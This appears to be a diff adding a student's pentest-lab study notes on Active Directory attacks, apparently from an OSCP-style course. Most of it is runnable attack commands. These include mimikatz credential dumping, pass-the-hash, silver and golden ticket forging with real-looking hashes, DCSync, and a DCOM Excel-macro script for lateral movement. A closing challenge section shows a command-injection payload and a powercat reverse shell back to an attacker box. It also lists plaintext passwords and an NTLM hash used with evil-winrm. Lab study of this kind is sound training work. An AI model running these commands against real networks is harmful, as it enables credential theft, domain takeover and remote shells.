@@ -127,4 +127,104 @@ Active Directory Authentication
 				Stealing a TGS would only allow us to particular resources associated with the tickets
 				Stealing a TGT would allow us to forge TGS's for arbitrary services
 
+lost my notes so quick recap on overpass the hash
+	get logonpasswords
+		mimikatz.exe
+		privilege::debug
+		sekurlsa::logonpasswords
+	sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
+	net use \\dc01
+	.\PsExec.exe \\dc01 cmd.exe
 
+	Pass the Ticket
+		TGS may be exported and reused on different machines
+		TGT can only be used on the machine it was granted for
+		If SPN is not local admin on any machines, cannot laterally move/ dump creds
+		Silver Ticket - forge our own service ticket to access a target resource
+		Mimikatz can create a silver ticket and inject it into memory
+			kerberos::golden
+		To create a ticket:
+			need the SID
+				SID Structure = S-R-I-S
+					S = Literal string "S"
+					R = Revision level (usually 1)
+					I = identifier authority (usually 5)
+					S = one or more subauthority values
+				ex. S-1-5-21-2536614405-3629634762-1218571035-1116
+					1116 = RID of the domain
+						can easily get the RID from our own SID
+							whoami /user
+		passing a  ticket with mimikatz
+			passing a ticket to an IIS webserver
+
+			kerberos::purge
+			kerberos::list
+			kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+				/user = username
+				/domain = domain name
+				/sid = sid of offsec account
+				/target = fully qualified hostname of the target (this example its a webserver)
+				/service = protocol of the app (HTTP for web here)
+				/rc4 = hash type of the password hash
+				/ptt = pass the ticket
+
+	Distribued Component Object Model - DCOM
+		COM = microsoft system for software components to interact
+			either same process or cross process interactoins
+		DCOM used for interaction between networked computers
+		Require the presence of Microsoft office, best used against workstations
+
+	Need some admin privs to access the smb shares
+	Create a macro enabled excel sheet, save it as .xls
+	Copy the file from the local machine to the victim box
+		$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
+
+		$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
+
+		[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+	Open the excel sheet
+		$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+		results in an error, file was created as the system user with desktop
+	Create a SYSTEM desktop Directory
+		$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+
+		$temp = [system.io.directory]::createDirectory($Path)
+
+	Final script
+		$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
+		$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
+		$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
+		[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+		$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+		$temp = [system.io.directory]::createDirectory($Path)
+		$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+		$com.Run("mymacro")
+
+AD Persistence
+	Golden Tickets
+		Encrypts TGTs with a secret key, the password hash of the domain user krbtgt
+		Could createa golden ticket saying an arbitrary domain user is a member of the domain admins group
+		find the krbtgt hash and pass the ticket like before
+			kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
+				/user is and /krbtgt are different
+
+			misc::cmd
+			psexec.exe \\dc01 cmd.exe
+
+			NOTE: psexec.exe \\192.168.1.110 cmd.exe does not work, need the hostname
+				giving the ip address would use NTLM auth instead of kerberos
+
+	DCSync
+		if compromised a domain controller, can dump all the admin password hashes
+			lsadump::dcsync /user:Administrator
+
+Challenge 1
+	CMD injection
+		| echo type hi | cmd.exe
+	Download powercat from kali box, place it in c:\Windows\TEMP\powercat.ps1
+	import the module and run the powercat shell
+		Import-Module -Name <path>; powercat -c ip -p port -e cmd.exe
+
+	Nathan:abc123//
+	Allison:RockYou!
+	evil-winrm -u Administrator -H 8c802621d2e36fc074345dded890f3e5 -i 192.168.130.57
